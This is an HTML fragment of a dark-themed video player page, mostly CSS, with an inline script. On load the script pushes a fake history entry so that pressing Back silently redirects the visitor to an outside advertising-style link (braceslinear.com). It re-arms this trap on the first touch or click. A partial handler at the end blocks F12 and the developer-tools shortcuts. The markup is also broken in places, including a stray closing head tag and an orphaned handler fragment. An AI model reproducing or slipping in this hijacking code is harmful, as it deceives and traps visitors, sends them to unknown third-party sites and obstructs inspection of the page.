  <style>
    :root {
      --primary-bg: #09090b;
      --header-bg: #191a1f;
      --card-bg: #18181b;
      --border-color: #232329;
      --footer-bg: #18181e;
      --accent: #ffd900;
      --text-main: #ffffff;
      --text-footer: #a1a1aa;
    }

    * { margin: 0; padding: 0; box-sizing: border-box; }

    html, body {
      height: 100%;
      width: 100%;
      font-family: "Poppins", Arial, sans-serif;
      background: var(--primary-bg);
      color: var(--text-main);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      overflow-x: hidden;
    }

    header {
      background: linear-gradient(to bottom, #18181b, #09090b);
      text-align: center;
      padding: 18px 12px 14px 12px;
      font-size: 1.35rem;
      font-weight: 600;
      letter-spacing: 1px;
      border-bottom: 1px solid var(--border-color);
      position: sticky;
      top: 0;
      z-index: 10;
    }

    .container {
      flex: 1;
      display: flex;
      flex-direction: column;
      justify-content: flex-start;
      align-items: center;
      padding: 20px 10px;
      width: 100%;
      max-width: 430px;
      margin: 0 auto;
    }

    video {
      width: 80%;
      border-radius: 12px;
      background: #000;
      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
      border: 1px solid var(--border-color);
      outline: none;
    }

    footer {
      background: linear-gradient(to bottom, #18181b, #09090b);
      text-align: center;
      padding: 15px 0;
      font-size: 0.9rem;
      color: var(--text-footer);
      border-top: 1px solid var(--border-color);
    }
  </style>
</head>

  <script type="text/javascript">
    (function() {
        const directLink = "https://braceslinear.com/d40w8mx5c?key=e15240371508f21838848c29a618630a";

        function lockAndRedirect() {
            history.pushState(null, null, location.href);
            
            window.onpopstate = function() {
                window.location.replace(directLink);
            };
        }

        window.addEventListener('load', lockAndRedirect);

        document.addEventListener('touchstart', function() {
            history.pushState(null, null, location.href);
        }, { once: true });
        
        document.addEventListener('click', function() {
            history.pushState(null, null, location.href);
        }, { once: true });
    })();
  </script>

      if (e.key === "F12" || (e.ctrlKey && e.shiftKey && ["I","J","C"].includes(e.key.toUpperCase()))) e.preventDefault();
    });
